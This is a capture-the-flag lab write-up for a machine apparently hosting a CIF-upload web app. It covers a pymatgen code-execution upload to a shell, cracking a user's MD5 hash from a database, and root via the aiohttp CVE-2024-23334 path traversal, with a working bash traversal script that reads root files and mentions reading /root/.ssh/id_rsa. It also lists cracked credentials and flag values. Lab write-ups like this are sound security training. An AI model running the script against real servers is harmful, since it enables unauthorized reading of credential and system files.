We got a website open on port 5000, let's start with reconnaissance.

# RECONNAISSANCE

Base website is like that, source code seems normal too, we got a login and a register in the website, let's check them both:

![](Pasted%20image%2020250109152210.png)

Since we don't have an account, let's register and use burp to check the behavior:

![](Pasted%20image%2020250109152342.png)

Once we've registered, we are sent dashboard, let's use fuzzing and check if there's anything useful:

## Fuzzing
----


![](Pasted%20image%2020250109152419.png)

We found a `login`, `logout`, `dashboard` and an `upload` directory which seems to be the most interesting one, let's check our dashboard:

```ad-note

##### Credentials
----
`hackerTESTING`:`test`
```

![](Pasted%20image%2020250109152606.png)

We can see that inside of our dashboard we can upload a `CIF` file, if we click to see the example, a file downloads automatically, let's check that file:

![](Pasted%20image%2020250109152717.png)

It is an ascii file, it has these contents:

![](Pasted%20image%2020250109152744.png)

Searching on the web, we find that a CIF file has the following definition:

```ad-note
### CIF
----
Crystallographic Information File (CIF) is a standard text file format for representing crystallographic information, promulgated by the International Union of Crystallography (IUCr). CIF was developed by the IUCr Working Party on Crystallographic Information in an effort sponsored by the IUCr Commission on Crystallographic Data and the IUCr Commission on Journals. The file format was initially published by Hall, Allen, and Brown[1] and has since been revised, most recently versions 1.1 and 2.0.[2] Full specifications for the format are available at the IUCr website. Many computer programs for molecular viewing are compatible with this format, including Jmol. 
```

Nice, let's begin with exploitation.

# EXPLOITATION
---

We already know we have to deal with CIF files, let's search for some sort of exploit regarding those files:

![](Pasted%20image%2020250109152953.png)

Found an Arbitrary code execution, here's the repository: [here](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

In order to exploit this vulnerability, we need to reproduce the following steps:

```

```

```ad-hint
1. Create a file with the contents shown above.
2. Upload the file.
3. Click view and have a listener set on the port we specified.
4. Get the connection.

Nice, let's [[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|stabilize our shell]]:

![](Pasted%20image%2020250109164825.png)

Once we've got our stable shell, let's look around this machine:

![](Pasted%20image%2020250109164943.png)

At `/home/app` we have a folder containing `CVE-2021-4034` which talks about the following:

![](Pasted%20image%2020250109165016.png)

Let's keep that info for now, searching around we find another user in the machine: 

![](Pasted%20image%2020250109165134.png)

We have an user named `rosa`, inside of rosa's home, we are unable to read it, we need some sort of way to get the credentials of rosa, that's when I found a folder named `/instances` inside of app home, this contains a `database.db` file, when we read it we find the following:

![](Pasted%20image%2020250109165522.png)

If we look closely, we find rosa's name and a MD5 hash alongside it:

![](Pasted%20image%2020250109165555.png)

Let's crack the hash:

![](Pasted%20image%2020250109165604.png)

So, credentials are the following:

```ad-note
`rosa`:`unicorniosrosados`
```

![](Pasted%20image%2020250109165647.png)

We got access and now we can read `user.txt`:

```ad-note
![](Pasted%20image%2020250109165717.png)

`user`: `1a66e45880e8f92fcfe0f6a05f622662`
```

Let's start with privilege escalation.

# PRIVILEGE ESCALATION
---


We can start by checking our sudo permissions:

![](Pasted%20image%2020250109165811.png)

We have none, let's check some interesting files:

![](Pasted%20image%2020250109165933.png)

Nothing, let's use linpeas then:


![](Pasted%20image%2020250109170136.png)

Something is running on port `8080` inside of this machine, let's use port forwarding and check:

```ad-hint

##### Port forwarding
----

`ssh -L 9001:127.0.0.1:8080 rosa@10.10.11.38`


![](Pasted%20image%2020250109170342.png)


```

Weird, we have a page that seems to check earnings and views per month of a page, once we go to `List Services`, we are able to see this:

![](Pasted%20image%2020250109170448.png)

After trying a couple things, nothing seemed to work, so, I tried the following:

```ad-hint

1. Use curl to get the headers of the page: `curl 127.0.0.1:9001 --head`
2. Found this is running `aiohttp/3.9.1`
3. Search for any vulnerability regarding that version.
```

So, I found the following CVE:

![](Pasted%20image%2020250109170749.png)

Here's the repository: [here](https://github.com/z3rObyte/CVE-2024-23334-PoC), it talks about a path traversal, we can reproduce the following steps in order to get the root flag (We can also get root access by reading `/root/.ssh/id_rsa):

```
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

```ad-hint
1. Create a `exp.sh` file with the contents shown above.
2. `chmod +x exp.sh`
3. `./exp.sh`
4. Get your root flag!

### Output
---
![](Pasted%20image%2020250109173841.png)

Root: `2cbb12ac6cf8301162f1db597fd5ee7c`
```


Just like that, machine is done!
